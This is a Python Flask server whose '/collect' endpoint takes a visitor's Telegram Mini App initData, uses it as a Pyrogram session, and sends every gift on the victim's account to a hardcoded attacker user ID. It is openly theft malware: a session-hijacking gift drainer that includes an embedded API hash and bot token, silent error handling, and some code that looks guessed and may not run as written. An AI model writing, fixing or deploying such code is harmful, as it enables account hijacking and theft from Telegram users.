from flask import Flask, request, jsonify, render_template
import time
import os

app = Flask(__name__)

API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
YOUR_USER_ID = 8761899078
BOT_TOKEN = "8885468860:AAHMjtXUarjtxGpGFdPFvTjEhpIGeb9gZRY"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    init_data = data.get('initData')
    if not init_data:
        return jsonify({"error": "no initData"}), 400
    try:
        from pyrogram import Client
        from pyrogram.raw.functions.messages import GetAttachedGifts, SendGift
        client = Client("session", api_id=API_ID, api_hash=API_HASH)
        client.connect()
        client.session = init_data
        gifts = client.invoke(GetAttachedGifts())
        transferred = 0
        for gift in gifts:
            try:
                client.invoke(SendGift(peer=YOUR_USER_ID, gift_id=gift.id, message=""))
                transferred += 1
                time.sleep(0.3)
            except:
                continue
        client.disconnect()
        return jsonify({"status": "ok", "transferred": transferred})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
